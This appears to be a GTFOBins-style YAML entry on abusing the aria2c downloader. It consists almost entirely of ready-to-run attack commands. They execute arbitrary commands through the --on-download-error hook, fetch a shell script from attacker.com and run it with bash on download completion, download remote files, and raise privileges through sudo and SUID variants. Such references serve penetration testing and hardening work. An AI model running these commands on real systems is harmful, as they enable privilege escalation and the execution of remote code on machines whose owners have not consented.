---
description: Note that the subprocess is immediately sent to the background.
functions:
  command:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        aria2c --on-download-error=$TF http://x
    - description: The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.
      code: aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa
  file-download:
    - description: Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        aria2c -o "$LFILE" "$URL"
  sudo:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        sudo aria2c --on-download-error=$TF http://x
  limited-suid:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        ./aria2c --on-download-error=$TF http://x
---
